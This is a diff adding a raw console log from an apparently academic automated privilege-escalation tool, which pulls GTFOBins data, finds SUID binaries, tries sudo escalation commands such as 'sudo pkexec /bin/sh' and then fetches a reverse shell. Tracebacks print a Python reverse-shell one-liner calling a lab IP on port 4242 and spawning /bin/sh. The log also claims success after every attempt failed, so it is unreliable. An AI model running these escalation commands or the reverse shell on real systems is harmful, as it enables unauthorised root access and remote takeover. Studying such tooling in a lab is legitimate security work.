@@ -1,0 +1,92 @@
+import-im6.q16: attempt to perform an operation not allowed by the security policy `PS' @ error/constitute.c/IsCoderAuthorized/421.
+import-im6.q16: attempt to perform an operation not allowed by the security policy `PS' @ error/constitute.c/IsCoderAuthorized/421.
+./test11.pyw: 3: from: not found
+./test11.pyw: 4: from: not found
+./test11.pyw: 5: from: not found
+./test11.pyw: 6: from: not found
+./test11.pyw: 8: Syntax error: "(" unexpected
+Cloning into 'GTFOBLookup'...
+Defaulting to user installation because normal site-packages is not writeable
+Requirement already satisfied: appdirs in /usr/lib/python3/dist-packages (from -r GTFOBLookup/requirements.txt (line 1)) (1.4.4)
+Requirement already satisfied: colorama in /usr/lib/python3/dist-packages (from -r GTFOBLookup/requirements.txt (line 2)) (0.4.6)
+Requirement already satisfied: gitpython in /usr/lib/python3/dist-packages (from -r GTFOBLookup/requirements.txt (line 3)) (3.1.30)
+Requirement already satisfied: pyyaml in /usr/lib/python3/dist-packages (from -r GTFOBLookup/requirements.txt (line 4)) (6.0)
+Requirement already satisfied: gitdb<5,>=4.0.1 in /usr/lib/python3/dist-packages (from gitpython->-r GTFOBLookup/requirements.txt (line 3)) (4.0.9)
+Checking GTFOBins for updates...
+Local copy of GTFOBins is up to date
+Checking LOLBAS for updates...
+Local copy of LOLBAS is up to date
+Checking WADComs for updates...
+Local copy of WADComs is up to date
+Checking HijackLibs for updates...
+Local copy of HijackLibs is up to date
+------------------------------------------------------------------------------------------
+Cloning GTFOBins...
+Cloning in process...
+Installing requirements...
+Installing new updates...
+Cloning successful !!!
+------------------------------------------------------------------------------------------
+Finding SUIDs...
+SUIDs found !!!
+------------------------------------------------------------------------------------------
+Filterning SUIDs (Phase 1)...
+SUIDs filtered. Phase 1 completed !!! 
+------------------------------------------------------------------------------------------
+Filterning SUIDs (Phase 2)...
+SUIDs filtered. Phase 2 completed !!! 
+------------------------------------------------------------------------------------------
+Extracting commands from GTFOBins...
+sudo pkexec /bin/sh
+
+sudo mount -o bind /bin/sh /bin/mount
+
+sudo mount
+
+sudo su
+
+Commands extraction successful.
+Total commands found:  4
+------------------------------------------------------------------------------------------
+Executing whoami...
+Command: whoami, executed in new thread...
+------------------------------------------------------------------------------------------
+Executing commands...
+Trying to hack using command:  sudo pkexec /bin/sh
+
+Testing if we got the root or not...
+Privlege escallation failed for:  sudo 
+Trying to hack using command:  sudo mount -o bind /bin/sh /bin/mount
+
+Testing if we got the root or not...
+Privlege escallation failed for:  sudo 
+Typing command: whoami
+Trying to hack using command:  sudo mount
+
+Testing if we got the root or not...
+Privlege escallation failed for:  sudo 
+Trying to hack using command:  sudo su
+
+Testing if we got the root or not...
+Privlege escallation failed for:  sudo 
+------------------------------------------------------------------------------------------
+Cleaning junks...
+Cleaning completed !!!
+
+------------------------------------------------------------------------------------------
+Privlege escallation succesful!
+Downloading shell script for reverse shell
+Traceback (most recent call last):
+  File "/home/dicey17/ENPM693/FinalProject/GTFOBins/test/tmpp.pyw", line 1, in <module>
+    import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")
+                                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionRefusedError: [Errno 111] Connection refused
+  File "/home/dicey17/ENPM693/FinalProject/GTFOBins/test/tmpp.pyw", line 1
+    import socket,os,pty;s=socket.socket();s.connect("192.168.163.129",int("4242")));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")
+                                                                                   ^
+SyntaxError: unmatched ')'
+Traceback (most recent call last):
+  File "/home/dicey17/ENPM693/FinalProject/GTFOBins/test/tmpp.pyw", line 1, in <module>
+    import socket,os,pty;s=socket.socket();s.connect("192.168.163.129",int("4242"));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")
+                                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: socket.connect() takes exactly one argument (2 given)
